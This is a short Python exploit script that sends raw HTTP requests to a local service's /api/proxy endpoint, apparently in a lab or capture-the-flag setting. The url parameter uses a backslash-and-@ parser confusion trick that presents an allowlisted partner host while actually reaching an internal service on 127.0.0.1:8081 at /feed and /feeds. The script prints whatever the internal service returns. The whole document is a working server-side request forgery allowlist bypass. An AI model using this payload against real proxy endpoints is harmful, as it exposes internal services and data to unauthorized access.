import socket
for path in ["/feed","/feeds"]:
    s=socket.create_connection(("127.0.0.1",24606),timeout=10)
    inner=f"http://rates.partner-forex.example.com\\@127.0.0.1:8081{path}"
    s.sendall(f"GET /api/proxy?url={inner} HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n".encode())
    s.settimeout(15); data=b""
    try:
        while True:
            c=s.recv(4096)
            if not c: break
            data+=c
    except Exception as e: data+=f"[{e}]".encode()
    print("==",path,len(data)); print(data[:500])
    s.close()
